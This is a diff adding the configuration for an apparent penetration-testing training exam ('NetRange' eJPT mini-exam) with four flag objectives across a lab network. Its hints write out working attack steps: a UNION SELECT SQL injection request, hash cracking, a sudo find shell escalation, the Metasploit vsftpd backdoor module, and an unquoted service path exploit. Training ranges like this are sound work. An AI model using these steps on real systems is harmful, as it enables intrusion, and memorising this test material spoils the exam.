@@ -1,0 +1,38 @@
+id: netrange-mini-exam-01
+title: "NetRange: eJPT Comprehensive Mini-Exam (4 Hosts, Dual-Subnet)"
+type: netrange
+track: pentest
+rank: 0
+estimated_minutes: 45
+briefing: briefing.md
+dataset:
+  generator: netrange_mini_exam
+  params: {}
+objectives:
+  - id: web
+    prompt: "Exploit the SQL injection vulnerability on exam-web01 (192.0.2.10) to dump database hashes and submit the web flag."
+    check: { kind: flag, answer_from: generator.flag_web }
+  - id: gateway
+    prompt: "Crack the recovered hash for gw_operator, log into exam-gw01 (192.0.2.20), escalate privileges via sudo, and submit /root/flag.txt."
+    check: { kind: flag, answer_from: generator.flag_gateway }
+  - id: internal
+    prompt: "Pivot into the 172.16.20.0/24 subnet, exploit the vulnerable vsftpd service on exam-internal01 (172.16.20.30) via Metasploit, and submit /home/appuser/flag.txt."
+    check: { kind: flag, answer_from: generator.flag_internal }
+  - id: crown
+    prompt: "Enumerate internal Windows server exam-win01 (172.16.20.40), authenticate as win_analyst, exploit the unquoted service path for ApexMaintenanceSvc to elevate to SYSTEM, and submit C:\\Users\\Administrator\\flag.txt."
+    check: { kind: flag, answer_from: generator.flag_crown }
+hints:
+  web:
+    - "Test http://192.0.2.10/portal/users.php?id=1 with UNION SELECT injection: curl 'http://192.0.2.10/portal/users.php?id=1+UNION+SELECT+1,username,password_hash+FROM+users'."
+  gateway:
+    - "Use hashcat -m 0 hashes.txt rockyou.txt or john to recover the plaintext password for gw_operator."
+    - "SSH into 192.0.2.20 as gw_operator, run sudo -l, and execute sudo find . -exec /bin/sh \\; to spawn a root shell."
+  internal:
+    - "Inspect eth1 on exam-gw01 (172.16.20.1/24) and add a route from Kali using ip route add 172.16.20.0/24 via 192.0.2.20."
+    - "Run msfconsole, select exploit/unix/ftp/vsftpd_234_backdoor, set RHOSTS 172.16.20.30, and exploit."
+  crown:
+    - "Read /home/appuser/ad_credentials.txt on exam-internal01 to obtain win_analyst credentials."
+    - "Connect to exam-win01 via evil-winrm -i 172.16.20.40 -u win_analyst -p <pass> or ssh win_analyst@172.16.20.40."
+    - "Inspect services using sc qc ApexMaintenanceSvc to discover the unquoted binary path, then trigger elevation with sc start ApexMaintenanceSvc."
+xp: 350
+mitre: ["T1190", "T1110.002", "T1548.003", "T1090", "T1059", "T1574.009"]
